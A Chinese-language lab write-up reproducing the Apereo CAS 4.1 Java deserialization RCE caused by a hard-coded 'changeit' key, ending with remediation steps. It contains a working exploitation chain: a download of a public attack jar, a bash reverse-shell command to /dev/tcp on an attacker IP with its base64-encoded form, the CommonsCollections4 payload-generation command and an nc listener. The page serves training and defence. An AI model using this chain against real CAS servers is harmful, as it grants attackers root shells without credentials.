# Apereo CAS 4.1 反序列化命令执行漏洞

> [English Documentation](README_EN.md)

| 属性 | 详情 |
|------|------|
| 漏洞编号 | CAS-4.1-RCE |
| 影响版本 | Apereo CAS < 4.1.7 |
| 漏洞类型 | Java 反序列化 + 远程代码执行（RCE） |
| 危险等级 | 🔴 严重 |
| 默认凭据 | 任意用户名/密码（无需有效账号） |
| 利用条件 | 可访问目标 CAS 登录页面（默认端口 8080） |

Apereo CAS 是 Apereo 发布的集中认证服务（Central Authentication Service）平台，广泛应用于企业内部单点登录（SSO）系统。在 4.1.7 之前的版本中，CAS 的 Webflow 组件使用了 `EncryptedTranscoder` 类处理加密传输，该类在初始化时硬编码了默认密钥 `changeit` 和算法 `AES/CBC/PKCS7`。

由于 `execution` 参数在登录流程中由服务端解密并进行 Java 反序列化，攻击者只需使用相同的硬编码密钥构造包含恶意 `CommonsCollections` 利用链的序列化数据，并将其作为 `execution` 参数提交到登录接口，即可在无需任何有效账号的情况下，触发目标服务器端的反序列化漏洞，以 `root` 权限执行任意系统命令。

该漏洞利用门槛极低：攻击者只需下载公开的利用工具 `apereo-cas-attack-1.0-SNAPSHOT-all.jar`，配合 `Burp Suite` 拦截登录请求并替换 `execution` 参数，即可一键获取服务器反弹 Shell。

## 漏洞复现

### 准备工作

靶机启动后，访问 `http://your-ip:8080/cas/login` 可以看到 Apereo CAS 的登录页面，确认服务正常运行。

![访问 Apereo CAS 登录页面](https://static.nextcyber.cn/attachments/images/course/task/2fdd8c6a9da845c78cbc8e0efefbea6f.png)

**漏洞根因**：`EncryptedTranscoder` 使用了硬编码默认密钥 `changeit`，如下源码所示：

```java
public class EncryptedTranscoder implements Transcoder {
    private CipherBean cipherBean;
    private boolean compression = true;

    public EncryptedTranscoder() throws IOException {
        BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();
        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec("AES", "CBC", "PKCS7"));
        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());
        bufferedBlockCipherBean.setKeyAlias("aes128");
        bufferedBlockCipherBean.setKeyPassword("changeit");  // 硬编码默认密钥
        bufferedBlockCipherBean.setNonce(new RBGNonce());
        this.setCipherBean(bufferedBlockCipherBean);
    }
    // ...
}
```

### 步骤一：下载利用工具并生成 Payload

在攻击机（Kali）上，使用 `wget` 下载 `apereo-cas-attack` 工具 jar 包：

```bash
wget https://github.com/vulhub/Apereo-CAS-Attack/releases/download/v1.0.0/apereo-cas-attack-1.0-SNAPSHOT-all.jar
```

> [!NOTE]
> 生成 Payload 时需要使用低版本 Java（推荐 JDK 1.8），高版本 Java 执行会失败。可通过 `java -version` 确认当前版本。

```bash
┌──(root㉿nextcyber)-[~]
└─# java -version
openjdk version "1.8.0_432-432"
OpenJDK Runtime Environment (build 1.8.0_432-432-b06)
OpenJDK 64-Bit Server VM (build 25.432-b06, mixed mode)
```

将反弹 Shell 命令进行 Base64 编码（将 IP 替换为攻击机实际地址）：

```bash
# 原始命令
bash -i >& /dev/tcp/192.168.2.6/1234 0>&1

# Base64 编码结果
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi8xMjM0IDA+JjE=

# 完整 Payload 命令
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}
```

使用 `apereo-cas-attack` 配合 `CommonsCollections4` 利用链生成加密后的序列化 Payload：

```bash
java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 \
  "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}"
```

命令执行后会输出一段 URL 编码的加密 Payload 字符串，复制备用。

### 步骤二：Burp Suite 拦截并替换 Payload

在攻击机上提前开启 `nc` 监听端口 `1234`：

```bash
nc -lvnp 1234
```

使用 `Burp Suite` 打开代理拦截，在浏览器中随意输入用户名和密码，点击登录按钮抓取请求包。将请求中 `Body` 里的 `execution` 参数值**完整替换**为上一步生成的 Payload，然后发送请求。

![Burp Suite 拦截登录请求并替换 execution 参数](https://static.nextcyber.cn/attachments/images/course/task/6ce7e97669124e4699ce0bdc91bddd64.png)

### 步骤三：获取反弹 Shell

稍等片刻，攻击机的 `nc` 监听端成功接收到反弹 Shell，用户为 `root`。

![漏洞利用成功，获取 root 反弹 Shell](https://static.nextcyber.cn/attachments/images/course/task/1256b464f617424f85c519a8589b1973.png)

## 修复建议

1. **立即升级至 4.1.7 或更高版本**：官方已在 4.1.7 中修复硬编码密钥问题，请立即升级 Apereo CAS。
2. **修改默认加密密钥**：在无法立即升级的情况下，修改 `EncryptedTranscoder` 使用的密钥（`keyPassword`），以随机强密码替换默认值 `changeit`，并重新构建部署。
3. **网络访问控制**：将 CAS 服务端口（8080/443）严格限制在内网可信 IP 范围，禁止公网直接访问登录接口。
4. **禁用不必要的序列化库**：移除或升级 `commons-collections` 等存在已知利用链的依赖，降低反序列化利用风险。
5. **部署 WAF 检测异常请求**：针对 CAS 登录接口部署 Web 应用防火墙，检测 `execution` 参数中携带异常序列化数据的请求，并进行拦截告警。
